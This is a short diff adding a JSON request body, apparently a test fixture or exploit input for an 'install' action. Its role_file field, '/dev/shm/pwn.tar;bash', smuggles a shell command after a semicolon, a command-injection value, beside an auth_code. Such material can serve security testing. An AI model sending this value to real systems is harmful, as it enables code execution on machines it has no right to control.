@@ -1,0 +1,7 @@
+{
+    "run": {
+        "action": "install",
+        "role_file": "/dev/shm/pwn.tar;bash"
+    },
+    "auth_code": "UHI75GHINKOP"
+}
